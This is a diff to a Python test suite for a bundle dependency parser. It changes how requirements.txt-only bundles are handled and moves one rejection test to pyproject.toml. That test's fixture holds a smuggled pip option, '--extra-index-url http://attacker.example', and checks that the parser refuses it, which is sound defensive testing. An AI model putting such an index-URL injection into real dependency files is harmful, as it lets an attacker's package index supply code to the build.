@@ -364,10 +364,10 @@ def test_lock_export_excludes_dev_dependencies():
     assert parse_dependencies(DATA / "bundle_locked").pip == ["runtime-dep==1.0.0"]
 
 
-def test_requirements_txt_is_still_read_when_no_pyproject():
-    deps = parse_dependencies(DATA / "bundle_requirements")
-    assert deps.pip == ["numpy==1.26.4"]
-    assert deps.system == []
+def test_requirements_txt_without_pyproject_is_rejected():
+    """Silently resolving to zero dependencies would upload fine and fail at inference instead."""
+    with pytest.raises(AssertionError, match=r"requirements\.txt.*pyproject\.toml"):
+        parse_dependencies(DATA / "bundle_requirements")
 
 
 def test_pyproject_wins_over_requirements_txt(tmp_path: Path):
@@ -397,7 +397,9 @@ def test_malformed_pyproject_is_rejected(tmp_path: Path):
 
 def test_unparseable_requirement_is_rejected_at_upload(tmp_path: Path):
     """Rejecting it here is what keeps a bad bundle from being committed and failing at service create."""
-    (tmp_path / "requirements.txt").write_text("--extra-index-url http://attacker.example\n")
+    (tmp_path / "pyproject.toml").write_text(
+        '[project]\nname = "b"\nversion = "0.1.0"\ndependencies = ["--extra-index-url http://attacker.example"]\n'
+    )
     with pytest.raises(AssertionError, match="requirement"):
         parse_dependencies(tmp_path)
 
